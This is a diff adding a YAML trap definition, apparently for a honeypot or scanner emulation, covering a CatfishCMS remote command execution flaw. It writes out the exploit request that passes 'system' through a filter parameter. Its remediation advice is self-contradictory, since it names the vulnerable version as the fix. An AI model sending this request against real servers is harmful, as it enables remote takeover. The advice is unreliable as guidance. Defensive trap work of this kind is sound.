@@ -1,0 +1,39 @@
+id: CNVD-2019-06255
+info:
+  name: CatfishCMS - Remote Command Execution
+  author: Lark-Lab
+  description: 'CatfishCMS 4.8.54 contains a remote command execution vulnerability
+    in the "method" parameter.
+
+    '
+  severity: critical
+  remediation: Upgrade to CatfishCMS version 4.8.54 or later.
+  reference:
+  - https://its401.com/article/yun2diao/91344725
+  - https://github.com/xwlrbh/Catfish/issues/4
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+  tags: cnvd,cnvd2019,rce,catfishcms
+traps:
+- request:
+    method: GET
+    path: ''
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: content="Catfish CMS
+- request:
+    method: GET
+    path: /s=set&_method=__construct&method=*&filter[]=system
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: OSPATHSHELLUSER
